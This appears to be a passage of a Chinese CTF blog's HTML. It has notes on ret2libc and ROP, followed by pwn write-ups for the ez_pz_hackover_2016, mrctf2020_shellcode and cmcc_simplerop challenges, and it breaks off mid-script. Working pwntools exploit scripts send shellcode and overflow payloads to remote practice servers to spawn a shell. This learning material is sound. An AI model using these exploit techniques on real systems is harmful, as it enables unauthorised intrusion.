+<p>3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./7.exe --only &quot;pop|ret&quot; | grep &quot;eax&quot;</span><br></pre></td></tr></table></figure>
+
+<p>4、在linux系统中，函数的调用是有一个系统调用号的。我们实验要调用的execve(“&#x2F;bin&#x2F;sh”,null,null)函数其系统调用号是11，即十六进制0xb。</p>
+<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>适用情况：开启了地址随机化，开了NX保护</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/182894.html">https://www.freebuf.com/news/182894.html</a></p>
+<p>思路：通过printf、puts、write把某一个libc函数打印出来，然后使用LibcSearcher根据该地址找到Libc版本，让该函数的绝对地址减去libc版本获取到的地址，得到libc的基址。再获取该Libc版本的system函数以及&#x2F;bin&#x2F;sh字符串的偏移量，与基址相加，就得到了它们的绝对地址，构造ROP就可以执行system(‘&#x2F;bin&#x2F;sh’)</p>
+<p>​		ret2libc 这种攻击方式主要是针对 动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”) 来打开 shell， 如此就只剩下两个问题：</p>
+<blockquote>
+<p>1、找到 system() 函数的地址；</p>
+</blockquote>
+<blockquote>
+<p> 2、在内存中找到 “&#x2F;bin&#x2F;sh” 这个字符串的地址。</p>
+</blockquote>
+<h3 id="环境安装搭建"><a href="#环境安装搭建" class="headerlink" title="环境安装搭建"></a>环境安装搭建</h3><h4 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h4><p><a target="_blank" rel="noopener" href="https://www.zhaixue.cc/gdb/gdb-install.html">https://www.zhaixue.cc/gdb/gdb-install.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">https://blog.csdn.net/Breeze_CAT/article/details/103789233</a></p>
+<h4 id="pwntools-python"><a href="#pwntools-python" class="headerlink" title="pwntools  python"></a>pwntools  python</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43833642/article/details/104181681">https://blog.csdn.net/weixin_43833642/article/details/104181681</a></p>
+<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45556441/article/details/114631043">https://blog.csdn.net/weixin_45556441/article/details/114631043</a></p>
+<p>context(arch &#x3D; ‘amd64’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’) </p>
+<p>context(arch &#x3D; ‘i386’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’) </p>
+<p>shellcode&#x3D;asm(shellcraft.sh()) </p>
+<p>p.sendline(shellcode)</p>
+<h3 id="libc接收"><a href="#libc接收" class="headerlink" title="libc接收"></a>libc接收</h3><p>read_addr &#x3D; u32(p.recvuntil(“\xf7”)[-4:])</p>
+<p>write_addr&#x3D;u64(r.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’))</p>
+<p>puts_addr &#x3D; u64(p.recvuntil(‘\n’)[:-1].ljust(8,’\0’))</p>
+<p>getshell可以使用system(‘&#x2F;bin&#x2F;sh’) system(‘&#x2F;sh’) system(‘sh’) 因此找到的字符串有&#x2F;bin&#x2F;sh、&#x2F;sh或者sh。这里使用ROPgadget找到了，注意在IDA查看字符串的话是找不到的。</p>
+<p>#程序需要正常退出才能输出结果，因此执行完getflag后就exit</p>
+<p>read_addr &#x3D; u32(p.recvuntil(“\xf7”)[-4:])</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/ez_pz_hackover_2016/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ez_pz_hackover_2016/" class="post-title-link" itemprop="url">ez_pz_hackover_2016</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-11 23:10:49" itemprop="dateCreated datePublished" datetime="2021-10-11T23:10:49+08:00">2021-10-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:48:56" itemprop="dateModified" datetime="2022-07-19T09:48:56+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p><img src="/ez_pz_hackover_2016/1.jpg"></p>
+<p>保护基本都没有开，可以考虑shellcode。</p>
+<p>查看字符串，没有发现&#x2F;bin&#x2F;sh</p>
+<p>使用ida查看重要代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  header();</span><br><span class="line">  chall();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);    <span class="comment">//栈地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);                        <span class="comment">// 输入到s </span></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="number">10</span>, v0);      </span><br><span class="line">  <span class="comment">//C 库函数 void *memchr(const void *str, int c, size_t n) 在参数 str 所指向的字符串的前 n 个字节中搜索第一次出现字符 c（一个无符号字符）的位置。   这里的10就是指换行符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v3 )         <span class="comment">//没有作用</span></span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = (<span class="type">void</span> *)<span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);    <span class="comment">//strcmp以0x00结尾，认为0x00就是字符串结束了，不会再对后面的继续做判断</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )       <span class="comment">//要求strcmp的比较结果为0，也就是相等</span></span><br><span class="line">    result = vuln((<span class="type">char</span>)s, <span class="number">0x400</span>u);    <span class="comment">//调用vuln，限制的长度为0x400</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);              <span class="comment">// 可以溢出，memcpy不是以0x00结尾的，而是看n的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路：可以构造一个shellcode，然后通过输入s写到栈上，在vuln的溢出时把ret地址覆盖，返回到shellcode的起始地址。</p>
+<p>要成功执行我们的shellcode必须要知道shellcode的位置，而chall函数在执行时就把s缓冲区的地址告诉了我们，因此，只要知道了s缓冲区和shellcode地址的相对偏移量，那么我们每次都可以得到shellcode的地址<br>那通过脚本调试先确定好执行到覆盖栈的偏移量</p>
+<p>测试payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x8048600&#x27;</span>)<span class="comment">#利用gdb动调，在0x8048600处下了个断点</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)<span class="comment">#接收回显的参数s在栈上的地址，长度是10，以16进制表示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa&#x27;</span><span class="comment">#前面的crashme\x00绕过if判断</span></span><br><span class="line">      <span class="comment">#后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址</span></span><br><span class="line">      <span class="comment">#利用它找到返回地址在栈上的地址，将返回地址覆盖为shellcode</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()<span class="comment">#linxu下的暂停程序命令</span></span><br></pre></td></tr></table></figure>
+
+<p>断点0x8048600就是在memcpy复制完之后，这样就能知道溢出的长度为多少</p>
+<p><img src="/ez_pz_hackover_2016/2.jpg"></p>
+<p>经过调试，可以知道，溢出的长度为18.</p>
+<p><img src="/ez_pz_hackover_2016/3.jpg"></p>
+<p>需要让程序返回到shellcode的起始地址，则需要对地址进行计算，对构造的payload进行理解</p>
+<p>‘crashme\x00’+’aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa’</p>
+<p>这是我们在测试时候构造的payload，其中让他转会为shellcode</p>
+<p>‘crashme\x00后的18个字母是填充字母，无所谓（包含了ebp了），其后的4个字母是ret地址，要填写shellcode地址。</p>
+<p>最后的部位填写shellcode，也就是从aaga的部分开始，我们一开始得到了一个地址，search ‘aaga’得到该字符串的栈地址，通过该地址计算偏移，得到0x1c。</p>
+<p><img src="/ez_pz_hackover_2016/4.jpg"></p>
+<p>因此最终的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,27872)</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">#context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;crash&#x27;)</span><br><span class="line">p.recv(2)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">print(&#x27;stack_addr:&#x27; + hex(stack_addr))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = &#x27;crashme\x00&#x27; + &#x27;a&#x27;*18 + p32(stack_addr-0x1c) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/mrctf2020_shellcode%20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/mrctf2020_shellcode%20/" class="post-title-link" itemprop="url">mrctf2020_shellcode</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-06 21:15:38" itemprop="dateCreated datePublished" datetime="2021-10-06T21:15:38+08:00">2021-10-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:55:20" itemprop="dateModified" datetime="2022-07-19T09:55:20+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p><img src="/mrctf2020_shellcode/1.jpg"></p>
+<p>查看ida，发现main函数无法反编译，查看main函数的汇编代码，发现是一个shellcode执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000001155</span>     main            proc near               ; DATA XREF: _start+<span class="number">1</span>D↑o</span><br><span class="line">.text:<span class="number">0000000000001155</span></span><br><span class="line">.text:<span class="number">0000000000001155</span>     buf             = byte ptr <span class="number">-410</span>h</span><br><span class="line">.text:<span class="number">0000000000001155</span>     var_4           = dword ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">0000000000001155</span></span><br><span class="line">.text:<span class="number">0000000000001155</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001155</span> <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000001156</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001159</span> <span class="number">008</span>                 sub     rsp, <span class="number">410</span>h</span><br><span class="line">.text:<span class="number">0000000000001160</span> <span class="number">418</span>                 mov     rax, cs:<span class="built_in">stdin</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">0000000000001167</span> <span class="number">418</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">000000000000116</span>C <span class="number">418</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">000000000000116F</span> <span class="number">418</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">0000000000001174</span> <span class="number">418</span>                 mov     rax, cs:<span class="built_in">stdout</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">000000000000117B</span> <span class="number">418</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">0000000000001180</span> <span class="number">418</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">0000000000001183</span> <span class="number">418</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">0000000000001188</span> <span class="number">418</span>                 mov     rax, cs:<span class="built_in">stderr</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">000000000000118F</span> <span class="number">418</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">0000000000001194</span> <span class="number">418</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">0000000000001197</span> <span class="number">418</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">000000000000119</span>C <span class="number">418</span>                 lea     rdi, s          ; <span class="string">&quot;Show me your magic!&quot;</span></span><br><span class="line">.text:<span class="number">00000000000011</span>A3 <span class="number">418</span>                 call    _puts</span><br><span class="line">.text:<span class="number">00000000000011</span>A8 <span class="number">418</span>                 lea     rax, [rbp+buf]     </span><br><span class="line">.text:<span class="number">00000000000011</span>AF <span class="number">418</span>                 mov     edx, <span class="number">400</span>h       ; nbytes</span><br><span class="line">.text:<span class="number">00000000000011B</span>4 <span class="number">418</span>                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">00000000000011B</span>7 <span class="number">418</span>                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">.text:<span class="number">00000000000011B</span>C <span class="number">418</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011</span>C1 <span class="number">418</span>                 call    _read      ;读<span class="number">400</span>长度的内容到栈上</span><br><span class="line">.text:<span class="number">00000000000011</span>C6 <span class="number">418</span>                 mov     [rbp+var_4], eax</span><br><span class="line">.text:<span class="number">00000000000011</span>C9 <span class="number">418</span>                 cmp     [rbp+var_4], <span class="number">0</span>     判断读入的长度，read的返回值返回到eax中</span><br><span class="line">.text:<span class="number">00000000000011</span>CD <span class="number">418</span>                 jg      <span class="type">short</span> loc_11D6</span><br><span class="line">.text:<span class="number">00000000000011</span>CF <span class="number">418</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011</span>D4 <span class="number">418</span>                 jmp     <span class="type">short</span> locret_11E4</span><br><span class="line">.text:<span class="number">00000000000011</span>D6     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000000011</span>D6</span><br><span class="line">.text:<span class="number">00000000000011</span>D6     loc_11D6:                               ; CODE XREF: main+<span class="number">78</span>↑j</span><br><span class="line">.text:<span class="number">00000000000011</span>D6 <span class="number">418</span>                 lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">00000000000011</span>DD <span class="number">418</span>                 call    rax         ;指向栈上的内容，也就是shellcode，有栈执行权限</span><br><span class="line">.text:<span class="number">00000000000011</span>DF <span class="number">418</span>                 mov     eax, <span class="number">0</span> </span><br><span class="line">.text:<span class="number">00000000000011E4</span></span><br><span class="line">.text:<span class="number">00000000000011E4</span>     locret_11E4:                            ; CODE XREF: main+<span class="number">7F</span>↑j</span><br><span class="line">.text:<span class="number">00000000000011E4</span> <span class="number">418</span>                 leave</span><br><span class="line">.text:<span class="number">00000000000011E5</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">00000000000011E5</span>     ; &#125; <span class="comment">// starts at 1155</span></span><br><span class="line">.text:<span class="number">00000000000011E5</span>     main            endp</span><br></pre></td></tr></table></figure>
+
+<p>因此写入shellcode即可getshell，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26825</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/cmcc_simplerop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/cmcc_simplerop/" class="post-title-link" itemprop="url">cmcc_simplerop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-06 19:54:49" itemprop="dateCreated datePublished" datetime="2021-10-06T19:54:49+08:00">2021-10-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:45:56" itemprop="dateModified" datetime="2022-07-19T09:45:56+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p><img src="/cmcc_simplerop/1.jpg"></p>
+<p>使用ida查看主要函数以及字符串，没有发现&#x2F;bin&#x2F;sh</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);  <span class="comment">//溢出的长度为80</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/cmcc_simplerop/2.jpg"></p>
+<p>查看段，发现bss段可以写，并且有read函数，结合题目，可以猜测构造rop链。</p>
+<p>先使用read函数写&#x2F;bin&#x2F;sh到bss段，再使用system函数执行system(‘&#x2F;bin&#x2F;sh’)。</p>
+<p>构造payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span 